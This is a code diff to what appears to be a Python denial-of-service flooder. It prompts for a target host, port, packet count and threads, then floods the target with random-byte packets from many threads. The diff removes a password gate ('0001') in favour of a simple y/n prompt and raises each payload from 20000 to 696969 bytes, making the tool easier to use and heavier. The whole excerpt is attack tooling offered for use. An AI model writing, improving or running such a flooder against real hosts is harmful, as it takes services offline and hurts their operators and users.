@@ -41,7 +41,7 @@ print("Subs Han JetX")
 
 ip = str(input("> HOST/IP:"))
 port = int(input("> PORT:"))
-choice = str(input("> Password:"))
+choice = str(input("> y/n:"))
 times = int(input("> Packet:"))
 threads = int(input("> Theards:"))
 def run():
@@ -58,7 +58,7 @@ def run():
 			print("[!] Error!!!")
 
 def run2():
-	data = random._urandom(20000)
+	data = random._urandom(696969)
 	i = random.choice(("\033[31mAHHHHHH KOKKK NEMBUSSS","",""))
 	while True:
 		try:
@@ -74,7 +74,7 @@ def run2():
 			time.sleep(.1)
             
 for v in range(threads):
-	if choice == '0001':
+	if choice == 'y':
 		th = threading.Thread(target = run)
 		th.start()
 	else:
